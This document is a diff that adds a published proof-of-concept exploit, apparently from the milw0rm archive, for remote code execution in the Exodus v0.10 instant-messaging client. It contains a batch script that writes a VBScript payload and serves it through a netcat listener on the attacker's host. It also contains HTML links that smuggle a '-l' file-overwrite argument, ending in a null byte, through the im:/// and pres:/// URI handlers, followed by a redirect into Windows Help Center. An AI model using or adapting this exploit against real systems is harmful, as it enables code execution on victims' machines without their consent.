@@ -1,0 +1,37 @@
+<!--
+Exodus v0.10 remote code execution exploit
+by Nine:Situations:Group::strawdog
+
+This uses the "-l" argument to overwrite a file
+inside Microsoft Help and Support Center folders (oh rgod...)
+
+Firstly run netcat in listen mode to drop the vbscript shell
+run this script:
+
+@echo off
+rem dropsh.cmd
+echo ^<SCRIPT LANGUAGE="VBScript"^> > testfile
+echo Dim wshShell >> testfile
+echo Set wshShell = CreateObject("WScript.Shell") >> testfile
+echo wshShell.Run("cmd /c start calc") >> testfile
+echo ^</SCRIPT^> >> testfile
+nc -L -s 192.168.0.1 -p 5222 -vv < testfile
+
+-->
+<html>
+<head>
+<script type="text/javascript">
+<!--
+function doRedirect() {
+location.href = "hcp://system/sysinfo/msinfo.htm";
+}
+function runcalc() {
+window.setTimeout("doRedirect()", 10000);
+}
+//-->
+</script>
+<a href="im:///'%20-l%20C:\WINDOWS\PCHEALTH\HELPCTR\System\sysinfo\msinfo.htm%20-j%20strawdog@192.168.0.1%20-p%20AAAA%20%00" onClick="runcalc()">click me</a><br>
+<a href="pres:///'%20-l%20C:\WINDOWS\PCHEALTH\HELPCTR\System\sysinfo\msinfo.htm%20-j%20strawdog@192.168.0.1%20-p%20AAAA%20%00" onClick="runcalc()">click me</a>
+</html>
+
+# milw0rm.com [2008-11-20]
